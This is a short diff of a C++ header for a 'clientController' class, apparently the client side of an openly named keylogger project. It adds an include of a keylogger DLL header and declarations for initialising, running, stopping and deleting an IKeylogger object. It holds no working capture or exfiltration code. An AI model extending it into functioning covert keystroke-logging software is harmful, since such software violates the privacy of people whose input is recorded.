@@ -2,6 +2,8 @@
 # define CLIENT_H__
 
 # include "DLibrary.h"
+# include "keylogger_dll/KeyloggerDLL.h"
+
 
 class	clientController {
 
@@ -18,8 +20,10 @@ public:
 
 	int			mainAction(int, char**);
 	void		sayHelloAction(void);
-	void		initKeyloggerAction(void);
-
+	IKeylogger*	initKeyloggerAction(void);
+	bool		runKeyloggerAction(IKeylogger* keylogger);
+	bool		stopKeyloggerAction(IKeylogger* keylogger);
+	void		deleteKeyloggerAction(IKeylogger* keylogger);
 };
 
 #endif /* !CLIENT_H__ */
